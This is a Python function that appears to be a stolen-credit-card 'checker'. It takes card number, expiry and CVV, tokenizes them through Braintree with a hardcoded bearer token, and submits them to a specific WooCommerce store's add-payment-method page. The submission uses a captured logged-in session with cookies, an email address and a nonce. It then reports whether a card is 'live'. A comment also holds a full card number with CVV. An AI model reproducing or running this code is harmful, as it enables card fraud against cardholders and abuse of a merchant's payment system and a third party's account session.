import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTU3NzQ4NzEsImp0aSI6IjczYjFiMmY3LWVlMGYtNDFkOS1hNWQ3LTgxNWRkYzY3YjEyNCIsInN1YiI6InMycjlzN3k1dnY5d215dmoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InMycjlzN3k1dnY5d215dmoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.7286O5LZXTQfazfbUTG8FNpgqb2GMorjuI6o3KZwUxFCPKxE1kqAlmFlb138-SAbG6r2EphxoFPnHnvmq8QEOg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0468ed4e-4a02-4564-8814-b540d6ba5917',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	     '_pin_unauth': 'dWlkPU1qWTBaR0poTjJFdE5EVm1OUzAwTVRWa0xXRXhPRFl0TWprNE0yVmlZbUV4WXpsaQ',
    '_gcl_au': '1.1.1878776177.1714475945',
    '_ga': 'GA1.1.1223670493.1714475945',
    '__attentive_id': '03a89229fdaf438195599c58d938ec27',
    '__attentive_cco': '1714475953198',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzE0NDc1OTUzNjc1LFwidW9cIjoxNzE0NDc1OTUzNjc1LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjAzYTg5MjI5ZmRhZjQzODE5NTU5OWM1OGQ5MzhlYzI3XCJ9In0=',
    '__attentive_dv': '1',
    'msg22': '1',
    'PHPSESSID': 'fab88cca69e7e5178d03147f093e41a8',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-05-14%2012%3A04%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F',
    'sbjs_first_add': 'fd%3D2024-05-14%2012%3A04%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__attentive_ss_referrer': 'https://sparkleandco.com/cart/',
    'attntv_mstore_email': 'ffffygtg5@gmail.com:0',
    'wordpress_logged_in_ffff0597bdb978750d952987c56f0691': 'ffffygtg5%7C1715861090%7CKsoGs9XWfFxTeVkitFJafStDiFsVxvbUNcBiiWkivyH%7C70ae143267ba8df65141a8c7ccbf1071dd1f7d4a6d29871c2ded662ba7f373b5',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '741942a1a26b411496362156e17e719d',
    'wp_woocommerce_session_ffff0597bdb978750d952987c56f0691': '253550%7C%7C1715861094%7C%7C1715857494%7C%7C1a4bd0001c2ebc8137dcbf0f7f282b43',
    '_ga_KL7TE06V1L': 'GS1.1.1715688308.7.1.1715688457.60.0.0',
    '_ga_2LXG5MWDYE': 'GS1.1.1715688308.7.1.1715688520.0.0.0',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fadd-payment-method%2F',
    '__attentive_pv': '6',
}
	
	headers = {
	    'authority': 'sparkleandco.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_pin_unauth=dWlkPU1qWTBaR0poTjJFdE5EVm1OUzAwTVRWa0xXRXhPRFl0TWprNE0yVmlZbUV4WXpsaQ; _gcl_au=1.1.1878776177.1714475945; _ga=GA1.1.1223670493.1714475945; __attentive_id=03a89229fdaf438195599c58d938ec27; __attentive_cco=1714475953198; _attn_=eyJ1Ijoie1wiY29cIjoxNzE0NDc1OTUzNjc1LFwidW9cIjoxNzE0NDc1OTUzNjc1LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjAzYTg5MjI5ZmRhZjQzODE5NTU5OWM1OGQ5MzhlYzI3XCJ9In0=; __attentive_dv=1; msg22=1; PHPSESSID=fab88cca69e7e5178d03147f093e41a8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-14%2012%3A04%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F; sbjs_first_add=fd%3D2024-05-14%2012%3A04%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fsparkleandco.com%2Fcart%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; __attentive_ss_referrer=https://sparkleandco.com/cart/; attntv_mstore_email=ffffygtg5@gmail.com:0; wordpress_logged_in_ffff0597bdb978750d952987c56f0691=ffffygtg5%7C1715861090%7CKsoGs9XWfFxTeVkitFJafStDiFsVxvbUNcBiiWkivyH%7C70ae143267ba8df65141a8c7ccbf1071dd1f7d4a6d29871c2ded662ba7f373b5; woocommerce_items_in_cart=1; woocommerce_cart_hash=741942a1a26b411496362156e17e719d; wp_woocommerce_session_ffff0597bdb978750d952987c56f0691=253550%7C%7C1715861094%7C%7C1715857494%7C%7C1a4bd0001c2ebc8137dcbf0f7f282b43; _ga_KL7TE06V1L=GS1.1.1715688308.7.1.1715688457.60.0.0; _ga_2LXG5MWDYE=GS1.1.1715688308.7.1.1715688520.0.0.0; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fadd-payment-method%2F; __attentive_pv=6',
    'origin': 'https://sparkleandco.com',
    'referer': 'https://sparkleandco.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = [
	     ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '15.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"3d9324b3e66ac69d12039b035c709bd9"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"3d9324b3e66ac69d12039b035c709bd9"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '15.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '77c7adf665'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]
	
	response = requests.post(
	    'https://sparkleandco.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bdaf9471-d28d-4e54-baf4-ca04499c659d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4174010099391014","expirationMonth":"08","expirationYear":"2025","cvv":"888"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
